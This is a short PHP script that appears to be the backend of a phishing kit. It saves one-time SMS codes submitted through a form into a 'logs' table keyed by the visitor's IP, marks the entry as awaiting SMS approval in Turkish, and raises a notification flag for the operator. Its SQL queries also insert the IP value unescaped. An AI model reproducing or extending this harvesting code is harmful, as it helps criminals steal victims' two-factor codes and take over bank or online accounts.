<?php

include_once("../.././config.php");
include_once("../.././monke/Data/Server/GrabIP.php");

if($_POST) {
    $sorgu = $pdo->prepare("UPDATE logs SET sms=? WHERE ip = '{$ip}'");
    $entry = $sorgu->execute(array(htmlspecialchars($_POST['otpCode'])));

    if($entry) {
        $pdo->query("UPDATE logs SET durum = 'SMS Onay Bekliyor' WHERE ip = '{$ip}'");
        $pdo->query("UPDATE logs_visitor SET sms_notify = 1 WHERE ip = '{$ip}'");
     }
}


?>